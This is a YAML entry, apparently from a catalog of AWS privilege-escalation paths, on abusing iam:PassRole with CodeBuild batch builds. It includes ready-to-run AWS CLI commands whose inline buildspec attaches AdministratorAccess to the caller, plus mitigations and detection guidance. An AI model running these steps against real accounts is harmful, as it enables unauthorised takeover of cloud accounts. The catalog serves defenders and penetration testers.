id: codebuild-004
name: iam:PassRole + codebuild:CreateProject + codebuild:StartBuildBatch
category: service-passrole
services:
- iam
- codebuild
description: A principal with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuildBatch` can create a new CodeBuild project configured for batch builds and attach an existing privileged IAM role to it. By starting a build batch with a malicious buildspec, the attacker can execute arbitrary code with the permissions of the attached role, allowing privilege escalation. This variation specifically leverages batch build capabilities, which require both project creation and batch build execution permissions. The level of access gained depends on the permissions of the available roles.
prerequisites:
  admin:
  - A role must exist that trusts codebuild.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
  - A role must exist that trusts codebuild.amazonaws.com to assume it
exploitationSteps:
  awscli:
  - step: 1
    command: aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`codebuild.amazonaws.com`]].RoleName'
    description: Discover roles that trust codebuild.amazonaws.com (optional but helpful for finding privileged roles to pass)
  - step: 2
    command: |
      aws codebuild create-project \
        --name privesc-batch-project \
        --source type=NO_SOURCE,buildspec="version: 0.2\nbatch:\n  fast-fail: false\n  build-list:\n    - identifier: privesc_build\n      buildspec: |\n        version: 0.2\n        phases:\n          build:\n            commands:\n              - echo \"Starting privilege escalation...\"\n              - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n              - echo \"Successfully attached AdministratorAccess!\"" \
        --artifacts type=NO_ARTIFACTS \
        --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \
        --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --build-batch-config serviceRole=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE
    description: Create a CodeBuild project configured for batch builds with the privileged role and malicious buildspec in batch format
  - step: 3
    command: aws codebuild start-build-batch --project-name privesc-batch-project
    description: Start the build batch to execute code with elevated privileges
  - step: 4
    command: aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID
    description: Monitor the build batch status and wait for completion (batch builds typically take 2-4 minutes)
  - step: 5
    command: aws iam list-users --max-items 3
    description: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.

  This specific variation requires:
  1. The ability to create CodeBuild projects (`codebuild:CreateProject`)
  2. The ability to start build batches (`codebuild:StartBuildBatch`)
  3. The ability to pass a role to CodeBuild service (`iam:PassRole`)
  4. A role that trusts codebuild.amazonaws.com

  Batch builds add complexity compared to standard builds but provide the same privilege escalation capability.
recommendation: |
  Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificCodeBuildRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "codebuild.amazonaws.com"
      }
    }
  }
  ```

  Additional controls:
  - **Separate Permissions**: Avoid granting `codebuild:CreateProject` and `iam:PassRole` to the same principal
  - **Restrict CodeBuild Project Creation**: Limit `codebuild:CreateProject` to specific project name patterns or require approval workflows
  - **Service Role Controls**: Ensure CodeBuild service roles follow least privilege and cannot modify IAM permissions
  - **Monitor CloudTrail**: Alert on `CreateProject` API calls where privileged roles are being passed, and monitor batch build starts with `StartBuildBatch`
  - **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls from CodeBuild service principals
  - **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies
  - **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild and PassRole
  - **Require Source Control**: Configure organizational policies to require buildspecs from source control repositories rather than inline definitions
  - **Role Trust Policies**: Review roles that trust codebuild.amazonaws.com and ensure they follow least privilege
discoveredBy:
  name: Spencer Gietzen
  organization: Rhino Security Labs
  date: '2019'
references:
- title: AWS Privilege Escalation Methods
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: IAM Vulnerable - CodeBuild PassRole
  url: https://github.com/BishopFox/iam-vulnerable
- title: HackTricks - AWS - Codebuild Privesc
  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc/index.html#codebuildstartbuild--codebuildstartbuildbatch
detectionTools:
  pmapper: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/codebuild_edges.py#L231
relatedPaths:
- codebuild-001
- codebuild-003
- ec2-001
- lambda-001
- cloudformation-001
toolSupport:
  pmapper: false
  iamVulnerable: true
  pacu: false
  prowler: false
learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: "privesc-one-hop/to-admin/iam-passrole+codebuild-createproject+codebuild-startbuildbatch"
    description: "Deploy Terraform into your own AWS account to practice this attack path"
  iam-vulnerable:
    type: open-source
    githubLink: https://github.com/BishopFox/iam-vulnerable
    scenario: "CodeBuild-CreateProjectPassRole"
    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section and must trust codebuild.amazonaws.com
  - permission: codebuild:CreateProject
    resourceConstraints: Must have permission to create CodeBuild projects
  - permission: codebuild:StartBuildBatch
    resourceConstraints: Must have permission to start build batches on the created project
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles that trust CodeBuild to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
  - permission: codebuild:BatchGetBuildBatches
    resourceConstraints: Helpful for monitoring build batch execution status and verifying successful exploitation
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The starting principal (user or role) with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuildBatch` permissions. This principal will create a CodeBuild project configured for batch builds with a privileged role attached and start a build batch to execute code with elevated privileges.
  - id: codebuild_project
    label: New CodeBuild Project (Batch Build)
    type: resource
    description: |
      The newly created CodeBuild project configured for batch builds with a malicious buildspec. The project is created with `codebuild:CreateProject` and configured to use a privileged IAM role via `iam:PassRole`. The batch buildspec contains commands that will execute when the build batch starts, designed to grant the starting principal administrative access or perform privileged actions. Batch builds allow for more complex build orchestration but provide the same privilege escalation capability as standard builds.
  - id: target_role
    label: Existing Role That Trusts the codebuild Service
    type: principal
    description: |
      The privileged IAM role that is passed to the CodeBuild project during creation. This role must trust codebuild.amazonaws.com as a principal in its trust policy. When the build batch executes, the CodeBuild environment automatically assumes this role and all buildspec commands run with this role's permissions.
  - id: execute_buildspec
    label: Execute batch buildspec commands
    type: action
    color: '#99ccff'
    description: |
      When the build batch starts, the CodeBuild environment assumes the target role and executes the batch buildspec commands with the role's permissions. The buildspec can perform various privileged actions such as attaching AdministratorAccess to the starting principal, creating new access keys, modifying IAM policies, or accessing sensitive data.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      If the target role has administrative permissions (AdministratorAccess or equivalent) or permissions to modify IAM policies (like `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:CreateAccessKey`), the buildspec successfully elevates the starting principal to administrator. The starting principal now has full administrative access to the AWS account.
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: |
      If the target role has some elevated permissions but not full admin or IAM write permissions, the buildspec can perform some privileged actions. This could include access to sensitive data (S3, RDS, DynamoDB) or the ability to pursue additional escalation paths. The level of additional access depends on the specific permissions of the target role.
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: |
      If the target role only has minimal permissions or permissions limited to logging/metrics, the buildspec execution may not provide meaningful privilege escalation. However, even limited access could be useful for reconnaissance or as part of a multi-step attack chain.
  edges:
  - from: start
    to: codebuild_project
    label: iam:PassRole + codebuild:CreateProject
    description: |
      The attacker creates a new CodeBuild project configured for batch builds and passes a privileged role to it. The project is created with a malicious inline batch buildspec that will execute commands to escalate privileges.

      Command:
      ```bash
      aws codebuild create-project \
        --name privesc-batch-project \
        --source type=NO_SOURCE,buildspec="version: 0.2\nbatch:\n  fast-fail: false\n  build-list:\n    - identifier: privesc_build\n      buildspec: |\n        version: 0.2\n        phases:\n          build:\n            commands:\n              - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" \
        --artifacts type=NO_ARTIFACTS \
        --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \
        --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --build-batch-config serviceRole=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE
      ```

      The batch buildspec contains commands to attach AdministratorAccess to the starting principal or perform other privileged actions.
  - from: codebuild_project
    to: target_role
    label: Project assumes role
    description: |
      When the CodeBuild build batch is started, the CodeBuild service automatically assumes the target role on behalf of the build environment. All buildspec commands then execute with the permissions granted to this role.
  - from: target_role
    to: execute_buildspec
    label: codebuild:StartBuildBatch
    description: |
      The attacker starts the build batch, which triggers execution of the batch buildspec commands with the target role's permissions. The build environment has full AWS SDK access and can make any API calls allowed by the role.

      Command:
      ```bash
      aws codebuild start-build-batch --project-name privesc-batch-project
      ```

      The buildspec commands execute automatically when the build batch starts. Monitor with `aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID` to track execution.
  - from: execute_buildspec
    to: admin_outcome
    label: If role has admin or IAM write permissions
    branch: A
    condition: admin
    description: |
      If the target role has AdministratorAccess or permissions to modify IAM (like `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:AddUserToGroup`, `iam:CreateAccessKey`), the buildspec successfully elevates the starting principal to administrator. The starting principal gains full control over the AWS account.
  - from: execute_buildspec
    to: partial_outcome
    label: If role has some elevated permissions
    branch: B
    condition: some_permissions
    description: |
      If the target role has elevated permissions but not full admin or IAM write access, the buildspec can perform some privileged actions. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables) or permissions that enable additional privilege escalation techniques through multi-hop attacks.
  - from: execute_buildspec
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: |
      If the target role only has minimal or non-sensitive permissions (like logs:CreateLogGroup, logs:PutLogEvents), the privilege escalation may not yield meaningful additional access. However, even limited access could be useful for reconnaissance or understanding the environment's configuration.
